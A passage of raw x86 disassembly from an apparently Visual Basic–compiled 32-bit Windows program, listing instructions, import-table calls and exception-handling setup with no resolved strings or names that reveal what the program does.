  4040d7:	8b d0                	mov    %eax,%edx
  4040d9:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4040dc:	83 c1 40             	add    $0x40,%ecx
  4040df:	ff 15 ec 10 40 00    	call   *0x4010ec
  4040e5:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  4040e8:	51                   	push   %ecx
  4040e9:	8d 55 bc             	lea    -0x44(%ebp),%edx
  4040ec:	52                   	push   %edx
  4040ed:	8d 45 b8             	lea    -0x48(%ebp),%eax
  4040f0:	50                   	push   %eax
  4040f1:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  4040f4:	51                   	push   %ecx
  4040f5:	6a 04                	push   $0x4
  4040f7:	ff 15 f0 10 40 00    	call   *0x4010f0
  4040fd:	83 c4 14             	add    $0x14,%esp
  404100:	8d 55 a8             	lea    -0x58(%ebp),%edx
  404103:	52                   	push   %edx
  404104:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404107:	50                   	push   %eax
  404108:	6a 02                	push   $0x2
  40410a:	ff 15 28 10 40 00    	call   *0x401028
  404110:	83 c4 0c             	add    $0xc,%esp
  404113:	c7 45 fc 17 00 00 00 	movl   $0x17,-0x4(%ebp)
  40411a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40411d:	8b 51 40             	mov    0x40(%ecx),%edx
  404120:	52                   	push   %edx
  404121:	68 dc 2e 40 00       	push   $0x402edc
  404126:	ff 15 34 10 40 00    	call   *0x401034
  40412c:	8b d0                	mov    %eax,%edx
  40412e:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  404131:	ff 15 20 11 40 00    	call   *0x401120
  404137:	8b d0                	mov    %eax,%edx
  404139:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40413c:	83 c1 44             	add    $0x44,%ecx
  40413f:	ff 15 ec 10 40 00    	call   *0x4010ec
  404145:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  404148:	ff 15 3c 11 40 00    	call   *0x40113c
  40414e:	c7 45 fc 18 00 00 00 	movl   $0x18,-0x4(%ebp)
  404155:	8b 45 08             	mov    0x8(%ebp),%eax
  404158:	83 c0 40             	add    $0x40,%eax
  40415b:	89 85 60 ff ff ff    	mov    %eax,-0xa0(%ebp)
  404161:	c7 85 58 ff ff ff 08 	movl   $0x4008,-0xa8(%ebp)
  404168:	40 00 00 
  40416b:	8d 8d 58 ff ff ff    	lea    -0xa8(%ebp),%ecx
  404171:	51                   	push   %ecx
  404172:	8d 55 98             	lea    -0x68(%ebp),%edx
  404175:	52                   	push   %edx
  404176:	ff 15 30 10 40 00    	call   *0x401030
  40417c:	8b 45 08             	mov    0x8(%ebp),%eax
  40417f:	83 c0 3c             	add    $0x3c,%eax
  404182:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  404188:	c7 85 48 ff ff ff 08 	movl   $0x4008,-0xb8(%ebp)
  40418f:	40 00 00 
  404192:	8d 8d 48 ff ff ff    	lea    -0xb8(%ebp),%ecx
  404198:	51                   	push   %ecx
  404199:	8d 55 88             	lea    -0x78(%ebp),%edx
  40419c:	52                   	push   %edx
  40419d:	ff 15 30 10 40 00    	call   *0x401030
  4041a3:	8d 45 98             	lea    -0x68(%ebp),%eax
  4041a6:	50                   	push   %eax
  4041a7:	8d 4d 88             	lea    -0x78(%ebp),%ecx
  4041aa:	51                   	push   %ecx
  4041ab:	ff 15 08 11 40 00    	call   *0x401108
  4041b1:	66 89 85 20 ff ff ff 	mov    %ax,-0xe0(%ebp)
  4041b8:	8d 55 88             	lea    -0x78(%ebp),%edx
  4041bb:	52                   	push   %edx
  4041bc:	8d 45 98             	lea    -0x68(%ebp),%eax
  4041bf:	50                   	push   %eax
  4041c0:	6a 02                	push   $0x2
  4041c2:	ff 15 1c 10 40 00    	call   *0x40101c
  4041c8:	83 c4 0c             	add    $0xc,%esp
  4041cb:	0f bf 8d 20 ff ff ff 	movswl -0xe0(%ebp),%ecx
  4041d2:	85 c9                	test   %ecx,%ecx
  4041d4:	74 46                	je     0x40421c
  4041d6:	c7 45 fc 19 00 00 00 	movl   $0x19,-0x4(%ebp)
  4041dd:	8d 55 98             	lea    -0x68(%ebp),%edx
  4041e0:	52                   	push   %edx
  4041e1:	8b 45 08             	mov    0x8(%ebp),%eax
  4041e4:	8b 08                	mov    (%eax),%ecx
  4041e6:	8b 55 08             	mov    0x8(%ebp),%edx
  4041e9:	52                   	push   %edx
  4041ea:	ff 91 fc 06 00 00    	call   *0x6fc(%ecx)
  4041f0:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  4041f3:	ff 15 10 10 40 00    	call   *0x401010
  4041f9:	c7 45 fc 1a 00 00 00 	movl   $0x1a,-0x4(%ebp)
  404200:	8d 45 98             	lea    -0x68(%ebp),%eax
  404203:	50                   	push   %eax
  404204:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404207:	8b 11                	mov    (%ecx),%edx
  404209:	8b 45 08             	mov    0x8(%ebp),%eax
  40420c:	50                   	push   %eax
  40420d:	ff 92 00 07 00 00    	call   *0x700(%edx)
  404213:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  404216:	ff 15 10 10 40 00    	call   *0x401010
  40421c:	c7 45 fc 1c 00 00 00 	movl   $0x1c,-0x4(%ebp)
  404223:	e9 59 fd ff ff       	jmp    0x403f81
  404228:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  40422f:	68 9d 42 40 00       	push   $0x40429d
  404234:	eb 54                	jmp    0x40428a
  404236:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  404239:	51                   	push   %ecx
  40423a:	8d 55 b4             	lea    -0x4c(%ebp),%edx
  40423d:	52                   	push   %edx
  40423e:	8d 45 b8             	lea    -0x48(%ebp),%eax
  404241:	50                   	push   %eax
  404242:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  404245:	51                   	push   %ecx
  404246:	8d 55 c0             	lea    -0x40(%ebp),%edx
  404249:	52                   	push   %edx
  40424a:	6a 05                	push   $0x5
  40424c:	ff 15 f0 10 40 00    	call   *0x4010f0
  404252:	83 c4 18             	add    $0x18,%esp
  404255:	8d 45 a8             	lea    -0x58(%ebp),%eax
  404258:	50                   	push   %eax
  404259:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  40425c:	51                   	push   %ecx
  40425d:	6a 02                	push   $0x2
  40425f:	ff 15 28 10 40 00    	call   *0x401028
  404265:	83 c4 0c             	add    $0xc,%esp
  404268:	8d 95 68 ff ff ff    	lea    -0x98(%ebp),%edx
  40426e:	52                   	push   %edx
  40426f:	8d 85 78 ff ff ff    	lea    -0x88(%ebp),%eax
  404275:	50                   	push   %eax
  404276:	8d 4d 88             	lea    -0x78(%ebp),%ecx
  404279:	51                   	push   %ecx
  40427a:	8d 55 98             	lea    -0x68(%ebp),%edx
  40427d:	52                   	push   %edx
  40427e:	6a 04                	push   $0x4
  404280:	ff 15 1c 10 40 00    	call   *0x40101c
  404286:	83 c4 14             	add    $0x14,%esp
  404289:	c3                   	ret
  40428a:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40428d:	ff 15 3c 11 40 00    	call   *0x40113c
  404293:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  404296:	ff 15 10 10 40 00    	call   *0x401010
  40429c:	c3                   	ret
  40429d:	8b 45 08             	mov    0x8(%ebp),%eax
  4042a0:	8b 08                	mov    (%eax),%ecx
  4042a2:	8b 55 08             	mov    0x8(%ebp),%edx
  4042a5:	52                   	push   %edx
  4042a6:	ff 51 08             	call   *0x8(%ecx)
  4042a9:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4042ac:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4042af:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4042b6:	5f                   	pop    %edi
  4042b7:	5e                   	pop    %esi
  4042b8:	5b                   	pop    %ebx
  4042b9:	8b e5                	mov    %ebp,%esp
  4042bb:	5d                   	pop    %ebp
  4042bc:	c2 04 00             	ret    $0x4
  4042bf:	ff 15 d0 10 40 00    	call   *0x4010d0
  4042c5:	cc                   	int3
  4042c6:	cc                   	int3
  4042c7:	cc                   	int3
  4042c8:	cc                   	int3
  4042c9:	cc                   	int3
  4042ca:	cc                   	int3
  4042cb:	cc                   	int3
  4042cc:	cc                   	int3
  4042cd:	cc                   	int3
  4042ce:	cc                   	int3
  4042cf:	cc                   	int3
  4042d0:	55                   	push   %ebp
  4042d1:	8b ec                	mov    %esp,%ebp
  4042d3:	83 ec 08             	sub    $0x8,%esp
  4042d6:	68 f6 12 40 00       	push   $0x4012f6
  4042db:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4042e1:	50                   	push   %eax
  4042e2:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4042e9:	83 ec 1c             	sub    $0x1c,%esp
  4042ec:	53                   	push   %ebx
  4042ed:	56                   	push   %esi
  4042ee:	57                   	push   %edi
  4042ef:	89 65 f8             	mov    %esp,-0x8(%ebp)
  4042f2:	c7 45 fc 28 12 40 00 	movl   $0x401228,-0x4(%ebp)
  4042f9:	8b 45 0c             	mov    0xc(%ebp),%eax
  4042fc:	33 ff                	xor    %edi,%edi
  4042fe:	89 7d e0             	mov    %edi,-0x20(%ebp)
  404301:	89 7d d8             	mov    %edi,-0x28(%ebp)
  404304:	89 38                	mov    %edi,(%eax)
  404306:	8b 45 08             	mov    0x8(%ebp),%eax
  404309:	50                   	push   %eax
  40430a:	8b 08                	mov    (%eax),%ecx
  40430c:	ff 91 fc 02 00 00    	call   *0x2fc(%ecx)
  404312:	8d 55 d8             	lea    -0x28(%ebp),%edx
  404315:	50                   	push   %eax
  404316:	52                   	push   %edx
  404317:	ff 15 54 10 40 00    	call   *0x401054
  40431d:	8b 45 d8             	mov    -0x28(%ebp),%eax
  404320:	68 e4 2e 40 00       	push   $0x402ee4
  404325:	50                   	push   %eax
  404326:	8b 08                	mov    (%eax),%ecx
  404328:	ff 91 b4 00 00 00    	call   *0xb4(%ecx)
  40432e:	3b c7                	cmp    %edi,%eax
  404330:	db e2                	fnclex
  404332:	7d 19                	jge    0x40434d
  404334:	8b 55 d8             	mov    -0x28(%ebp),%edx
  404337:	8b 35 38 10 40 00    	mov    0x401038,%esi
  40433d:	68 b4 00 00 00       	push   $0xb4
  404342:	68 c8 2e 40 00       	push   $0x402ec8
  404347:	52                   	push   %edx
  404348:	50                   	push   %eax
  404349:	ff d6                	call   *%esi
  40434b:	eb 06                	jmp    0x404353
  40434d:	8b 35 38 10 40 00    	mov    0x401038,%esi
  404353:	8b 45 d8             	mov    -0x28(%ebp),%eax
  404356:	6a ff                	push   $0xffffffff
  404358:	50                   	push   %eax
  404359:	8b 08                	mov    (%eax),%ecx
  40435b:	ff 91 dc 00 00 00    	call   *0xdc(%ecx)
  404361:	3b c7                	cmp    %edi,%eax
  404363:	db e2                	fnclex
  404365:	7d 11                	jge    0x404378
  404367:	8b 55 d8             	mov    -0x28(%ebp),%edx
  40436a:	68 dc 00 00 00       	push   $0xdc
  40436f:	68 c8 2e 40 00       	push   $0x402ec8
  404374:	52                   	push   %edx
  404375:	50                   	push   %eax
  404376:	ff d6                	call   *%esi
  404378:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40437b:	57                   	push   %edi
  40437c:	50                   	push   %eax
  40437d:	8b 08                	mov    (%eax),%ecx
  40437f:	ff 91 e4 00 00 00    	call   *0xe4(%ecx)
  404385:	3b c7                	cmp    %edi,%eax
  404387:	db e2                	fnclex
  404389:	7d 11                	jge    0x40439c
  40438b:	8b 55 d8             	mov    -0x28(%ebp),%edx
  40438e:	68 e4 00 00 00       	push   $0xe4
  404393:	68 c8 2e 40 00       	push   $0x402ec8
  404398:	52                   	push   %edx
  404399:	50                   	push   %eax
  40439a:	ff d6                	call   *%esi
  40439c:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40439f:	6a ff                	push   $0xffffffff
  4043a1:	50                   	push   %eax
  4043a2:	8b 08                	mov    (%eax),%ecx
  4043a4:	ff 91 c4 00 00 00    	call   *0xc4(%ecx)
  4043aa:	3b c7                	cmp    %edi,%eax
  4043ac:	db e2                	fnclex
  4043ae:	7d 11                	jge    0x4043c1
  4043b0:	8b 55 d8             	mov    -0x28(%ebp),%edx
  4043b3:	68 c4 00 00 00       	push   $0xc4
  4043b8:	68 c8 2e 40 00       	push   $0x402ec8
  4043bd:	52                   	push   %edx
  4043be:	50                   	push   %eax
  4043bf:	ff d6                	call   *%esi
  4043c1:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4043c4:	57                   	push   %edi
  4043c5:	50                   	push   %eax
  4043c6:	ff 15 5c 10 40 00    	call   *0x40105c
  4043cc:	68 e7 43 40 00       	push   $0x4043e7
  4043d1:	eb 0a                	jmp    0x4043dd
  4043d3:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  4043d6:	ff 15 10 10 40 00    	call   *0x401010
  4043dc:	c3                   	ret
  4043dd:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4043e0:	ff 15 40 11 40 00    	call   *0x401140
  4043e6:	c3                   	ret
  4043e7:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4043ea:	8b 55 e0             	mov    -0x20(%ebp),%edx
  4043ed:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4043f0:	5f                   	pop    %edi
  4043f1:	89 11                	mov    %edx,(%ecx)
  4043f3:	8b 55 e8             	mov    -0x18(%ebp),%edx
  4043f6:	5e                   	pop    %esi
  4043f7:	5b                   	pop    %ebx
  4043f8:	89 41 04             	mov    %eax,0x4(%ecx)
  4043fb:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4043fe:	89 51 08             	mov    %edx,0x8(%ecx)
  404401:	89 41 0c             	mov    %eax,0xc(%ecx)
  404404:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404407:	33 c0                	xor    %eax,%eax
  404409:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404410:	8b e5                	mov    %ebp,%esp
  404412:	5d                   	pop    %ebp
  404413:	c2 08 00             	ret    $0x8
  404416:	90                   	nop
  404417:	90                   	nop
  404418:	90                   	nop
  404419:	90                   	nop
  40441a:	90                   	nop
  40441b:	90                   	nop
  40441c:	90                   	nop
  40441d:	90                   	nop
  40441e:	90                   	nop
  40441f:	90                   	nop
  404420:	55                   	push   %ebp
  404421:	8b ec                	mov    %esp,%ebp
  404423:	83 ec 14             	sub    $0x14,%esp
  404426:	68 f6 12 40 00       	push   $0x4012f6
  40442b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404431:	50                   	push   %eax
  404432:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404439:	81 ec 90 00 00 00    	sub    $0x90,%esp
  40443f:	53                   	push   %ebx
  404440:	56                   	push   %esi
  404441:	57                   	push   %edi
  404442:	89 65 ec             	mov    %esp,-0x14(%ebp)
  404445:	c7 45 f0 38 12 40 00 	movl   $0x401238,-0x10(%ebp)
  40444c:	33 f6                	xor    %esi,%esi
  40444e:	89 75 f4             	mov    %esi,-0xc(%ebp)
  404451:	89 75 f8             	mov    %esi,-0x8(%ebp)
  404454:	89 75 e0             	mov    %esi,-0x20(%ebp)
  404457:	89 75 d0             	mov    %esi,-0x30(%ebp)
  40445a:	89 75 cc             	mov    %esi,-0x34(%ebp)
  40445d:	89 75 bc             	mov    %esi,-0x44(%ebp)
  404460:	89 75 ac             	mov    %esi,-0x54(%ebp)
  404463:	89 75 9c             	mov    %esi,-0x64(%ebp)
  404466:	89 75 8c             	mov    %esi,-0x74(%ebp)
  404469:	89 b5 7c ff ff ff    	mov    %esi,-0x84(%ebp)
  40446f:	8b 45 10             	mov    0x10(%ebp),%eax
  404472:	89 30                	mov    %esi,(%eax)
  404474:	6a 01                	push   $0x1
  404476:	ff 15 4c 10 40 00    	call   *0x40104c
  40447c:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40447f:	8b 11                	mov    (%ecx),%edx
  404481:	52                   	push   %edx
  404482:	ff 15 14 10 40 00    	call   *0x401014
  404488:	8b c8                	mov    %eax,%ecx
  40448a:	ff 15 8c 10 40 00    	call   *0x40108c
  404490:	89 85 64 ff ff ff    	mov    %eax,-0x9c(%ebp)
  404496:	33 c0                	xor    %eax,%eax
  404498:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40449b:	8b 3d 18 11 40 00    	mov    0x401118,%edi
  4044a1:	8b 1d 28 11 40 00    	mov    0x401128,%ebx
  4044a7:	66 3b 85 64 ff ff ff 	cmp    -0x9c(%ebp),%ax
  4044ae:	0f 8f 4e 02 00 00    	jg     0x404702
  4044b4:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4044b7:	89 4d 94             	mov    %ecx,-0x6c(%ebp)
  4044ba:	c7 45 8c 08 40 00 00 	movl   $0x4008,-0x74(%ebp)
  4044c1:	0f bf f0             	movswl %ax,%esi
  4044c4:	56                   	push   %esi
  4044c5:	8d 55 8c             	lea    -0x74(%ebp),%edx
  4044c8:	52                   	push   %edx
  4044c9:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4044cc:	50                   	push   %eax
  4044cd:	ff d7                	call   *%edi
  4044cf:	6a 01                	push   $0x1
  4044d1:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  4044d4:	51                   	push   %ecx
  4044d5:	8d 55 ac             	lea    -0x54(%ebp),%edx
  4044d8:	52                   	push   %edx
  4044d9:	ff d3                	call   *%ebx
  4044db:	c7 45 84 f4 2e 40 00 	movl   $0x402ef4,-0x7c(%ebp)
  4044e2:	c7 85 7c ff ff ff 08 	movl   $0x8,-0x84(%ebp)
  4044e9:	00 00 00 
  4044ec:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4044ef:	50                   	push   %eax
  4044f0:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  4044f6:	51                   	push   %ecx
  4044f7:	8d 55 9c             	lea    -0x64(%ebp),%edx
  4044fa:	52                   	push   %edx
  4044fb:	ff 15 c8 10 40 00    	call   *0x4010c8
  404501:	50                   	push   %eax
  404502:	ff 15 18 10 40 00    	call   *0x401018
  404508:	8b d0                	mov    %eax,%edx
  40450a:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40450d:	ff 15 20 11 40 00    	call   *0x401120
  404513:	50                   	push   %eax
  404514:	6a 05                	push   $0x5
  404516:	6a ff                	push   $0xffffffff
  404518:	6a 08                	push   $0x8
  40451a:	ff 15 d4 10 40 00    	call   *0x4010d4
  404520:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  404523:	ff 15 3c 11 40 00    	call   *0x40113c
  404529:	8d 45 9c             	lea    -0x64(%ebp),%eax
  40452c:	50                   	push   %eax
  40452d:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  404530:	51                   	push   %ecx
  404531:	8d 55 bc             	lea    -0x44(%ebp),%edx
  404534:	52                   	push   %edx
  404535:	6a 03                	push   $0x3
  404537:	ff 15 1c 10 40 00    	call   *0x40101c
  40453d:	68 14 2f 40 00       	push   $0x402f14
  404542:	6a 05                	push   $0x5
  404544:	68 2c 2f 40 00       	push   $0x402f2c
  404549:	ff 15 ac 10 40 00    	call   *0x4010ac
  40454f:	68 34 2f 40 00       	push   $0x402f34
  404554:	6a 05                	push   $0x5
  404556:	68 2c 2f 40 00       	push   $0x402f2c
  40455b:	ff 15 ac 10 40 00    	call   *0x4010ac
  404561:	83 c4 28             	add    $0x28,%esp
  404564:	6a 05                	push   $0x5
  404566:	ff 15 78 10 40 00    	call   *0x401078
  40456c:	8b 45 0c             	mov    0xc(%ebp),%eax
  40456f:	89 45 94             	mov    %eax,-0x6c(%ebp)
  404572:	c7 45 8c 08 40 00 00 	movl   $0x4008,-0x74(%ebp)
  404579:	56                   	push   %esi
  40457a:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  40457d:	51                   	push   %ecx
  40457e:	8d 55 bc             	lea    -0x44(%ebp),%edx
  404581:	52                   	push   %edx
  404582:	ff d7                	call   *%edi
  404584:	6a 01                	push   $0x1
  404586:	8d 45 bc             	lea    -0x44(%ebp),%eax
  404589:	50                   	push   %eax
  40458a:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  40458d:	51                   	push   %ecx
  40458e:	ff d3                	call   *%ebx
  404590:	c7 45 84 60 2f 40 00 	movl   $0x402f60,-0x7c(%ebp)
  404597:	c7 85 7c ff ff ff 08 	movl   $0x8,-0x84(%ebp)
  40459e:	00 00 00 
  4045a1:	8d 55 ac             	lea    -0x54(%ebp),%edx
  4045a4:	52                   	push   %edx
  4045a5:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  4045ab:	50                   	push   %eax
  4045ac:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  4045af:	51                   	push   %ecx
  4045b0:	ff 15 c8 10 40 00    	call   *0x4010c8
  4045b6:	50                   	push   %eax
  4045b7:	8d 55 cc             	lea    -0x34(%ebp),%edx
  4045ba:	52                   	push   %edx
  4045bb:	ff 15 c4 10 40 00    	call   *0x4010c4
  4045c1:	50                   	push   %eax
  4045c2:	8b 45 08             	mov    0x8(%ebp),%eax
  4045c5:	8b 48 3c             	mov    0x3c(%eax),%ecx
  4045c8:	51                   	push   %ecx
  4045c9:	ff 15 f4 10 40 00    	call   *0x4010f4
  4045cf:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  4045d2:	ff 15 3c 11 40 00    	call   *0x40113c
  4045d8:	8d 55 9c             	lea    -0x64(%ebp),%edx
  4045db:	52                   	push   %edx
  4045dc:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4045df:	50                   	push   %eax
  4045e0:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  4045e3:	51                   	push   %ecx
  4045e4:	6a 03                	push   $0x3
  4045e6:	ff 15 1c 10 40 00    	call   *0x40101c
  4045ec:	83 c4 10             	add    $0x10,%esp
  4045ef:	8b 55 0c             	mov    0xc(%ebp),%edx
  4045f2:	89 55 94             	mov    %edx,-0x6c(%ebp)
  4045f5:	c7 45 8c 08 40 00 00 	movl   $0x4008,-0x74(%ebp)
  4045fc:	56                   	push   %esi
  4045fd:	8d 45 8c             	lea    -0x74(%ebp),%eax
  404600:	50                   	push   %eax
  404601:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  404604:	51                   	push   %ecx
  404605:	ff d7                	call   *%edi
  404607:	6a 01                	push   $0x1
  404609:	8d 55 bc             	lea    -0x44(%ebp),%edx
  40460c:	52                   	push   %edx
  40460d:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404610:	50                   	push   %eax
  404611:	ff d3                	call   *%ebx
  404613:	c7 45 84 f4 2e 40 00 	movl   $0x402ef4,-0x7c(%ebp)
  40461a:	c7 85 7c ff ff ff 08 	movl   $0x8,-0x84(%ebp)
  404621:	00 00 00 
  404624:	6a 07                	push   $0x7
  404626:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  404629:	51                   	push   %ecx
  40462a:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  404630:	52                   	push   %edx
  404631:	8d 45 9c             	lea    -0x64(%ebp),%eax
  404634:	50                   	push   %eax
  404635:	ff 15 c8 10 40 00    	call   *0x4010c8
  40463b:	50                   	push   %eax
  40463c:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40463f:	51                   	push   %ecx
  404640:	ff 15 c4 10 40 00    	call   *0x4010c4
  404646:	50                   	push   %eax
  404647:	ff 15 38 11 40 00    	call   *0x401138
  40464d:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  404650:	ff 15 3c 11 40 00    	call   *0x40113c
  404656:	8d 55 9c             	lea    -0x64(%ebp),%edx
  404659:	52                   	push   %edx
  40465a:	8d 45 ac             	lea    -0x54(%ebp),%eax
  40465d:	50                   	push   %eax
  40465e:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  404661:	51                   	push   %ecx
  404662:	6a 03                	push   $0x3
  404664:	ff 15 1c 10 40 00    	call   *0x40101c
  40466a:	83 c4 10             	add    $0x10,%esp
  40466d:	8b 55 0c             	mov    0xc(%ebp),%edx
  404670:	89 55 94             	mov    %edx,-0x6c(%ebp)
  404673:	c7 45 8c 08 40 00 00 	movl   $0x4008,-0x74(%ebp)
  40467a:	56                   	push   %esi
  40467b:	8d 45 8c             	lea    -0x74(%ebp),%eax
  40467e:	50                   	push   %eax
  40467f:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  404682:	51                   	push   %ecx
  404683:	ff d7                	call   *%edi
  404685:	6a 01                	push   $0x1
  404687:	8d 55 bc             	lea    -0x44(%ebp),%edx
  40468a:	52                   	push   %edx
  40468b:	8d 45 ac             	lea    -0x54(%ebp),%eax
  40468e:	50                   	push   %eax
  40468f:	ff d3                	call   *%ebx
  404691:	c7 45 84 60 2f 40 00 	movl   $0x402f60,-0x7c(%ebp)
  404698:	c7 85 7c ff ff ff 08 	movl   $0x8,-0x84(%ebp)
  40469f:	00 00 00 
  4046a2:	6a 07                	push   $0x7
  4046a4:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  4046a7:	51                   	push   %ecx
  4046a8:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  4046ae:	52                   	push   %edx
  4046af:	8d 45 9c             	lea    -0x64(%ebp),%eax
  4046b2:	50                   	push   %eax
  4046b3:	ff 15 c8 10 40 00    	call   *0x4010c8
  4046b9:	50                   	push   %eax
  4046ba:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  4046bd:	51                   	push   %ecx
  4046be:	ff 15 c4 10 40 00    	call   *0x4010c4
  4046c4:	50                   	push   %eax
  4046c5:	ff 15 38 11 40 00    	call   *0x401138
  4046cb:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  4046ce:	ff 15 3c 11 40 00    	call   *0x40113c
  4046d4:	8d 55 9c             	lea    -0x64(%ebp),%edx
  4046d7:	52                   	push   %edx
  4046d8:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4046db:	50                   	push   %eax
  4046dc:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  4046df:	51                   	push   %ecx
  4046e0:	6a 03                	push   $0x3
  4046e2:	ff 15 1c 10 40 00    	call   *0x40101c
  4046e8:	83 c4 10             	add    $0x10,%esp
  4046eb:	b8 01 00 00 00       	mov    $0x1,%eax
  4046f0:	66 03 45 e0          	add    -0x20(%ebp),%ax
  4046f4:	0f 80 a0 00 00 00    	jo     0x40479a
  4046fa:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4046fd:	e9 a5 fd ff ff       	jmp    0x4044a7
  404702:	8b 55 08             	mov    0x8(%ebp),%edx
  404705:	66 c7 42 48 18 00    	movw   $0x18,0x48(%edx)
  40470b:	ff 15 44 10 40 00    	call   *0x401044
  404711:	68 6b 47 40 00       	push   $0x40476b
  404716:	eb 52                	jmp    0x40476a
  404718:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40471b:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40471e:	66 89 41 48          	mov    %ax,0x48(%ecx)
  404722:	66 85 c0             	test   %ax,%ax
  404725:	75 06                	jne    0x40472d
  404727:	66 c7 41 48 01 00    	movw   $0x1,0x48(%ecx)
  40472d:	ff 15 44 10 40 00    	call   *0x401044
  404733:	68 6b 47 40 00       	push   $0x40476b
  404738:	eb 30                	jmp    0x40476a
  40473a:	f6 45 f4 04          	testb  $0x4,-0xc(%ebp)
  40473e:	74 09                	je     0x404749
  404740:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  404743:	ff 15 10 10 40 00    	call   *0x401010
  404749:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40474c:	ff 15 3c 11 40 00    	call   *0x40113c
  404752:	8d 45 9c             	lea    -0x64(%ebp),%eax
  404755:	50                   	push   %eax
  404756:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  404759:	51                   	push   %ecx
  40475a:	8d 55 bc             	lea    -0x44(%ebp),%edx
  40475d:	52                   	push   %edx
  40475e:	6a 03                	push   $0x3
  404760:	ff 15 1c 10 40 00    	call   *0x40101c
  404766:	83 c4 10             	add    $0x10,%esp
  404769:	c3                   	ret
  40476a:	c3                   	ret
  40476b:	8b 45 10             	mov    0x10(%ebp),%eax
  40476e:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  404771:	89 08                	mov    %ecx,(%eax)
  404773:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  404776:	89 50 04             	mov    %edx,0x4(%eax)
  404779:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40477c:	89 48 08             	mov    %ecx,0x8(%eax)
  40477f:	8b 55 dc             	mov    -0x24(%ebp),%edx
  404782:	89 50 0c             	mov    %edx,0xc(%eax)
  404785:	33 c0                	xor    %eax,%eax
  404787:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40478a:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404791:	5f                   	pop    %edi
  404792:	5e                   	pop    %esi
  404793:	5b                   	pop    %ebx
  404794:	8b e5                	mov    %ebp,%esp
  404796:	5d                   	pop    %ebp
  404797:	c2 0c 00             	ret    $0xc
  40479a:	ff 15 d0 10 40 00    	call   *0x4010d0
  4047a0:	55                   	push   %ebp
  4047a1:	8b ec                	mov    %esp,%ebp
  4047a3:	83 ec 18             	sub    $0x18,%esp
  4047a6:	68 f6 12 40 00       	push   $0x4012f6
  4047ab:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4047b1:	50                   	push   %eax
  4047b2:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4047b9:	b8 10 01 00 00       	mov    $0x110,%eax
  4047be:	e8 2d cb ff ff       	call   0x4012f0
  4047c3:	53                   	push   %ebx
  4047c4:	56                   	push   %esi
  4047c5:	57                   	push   %edi
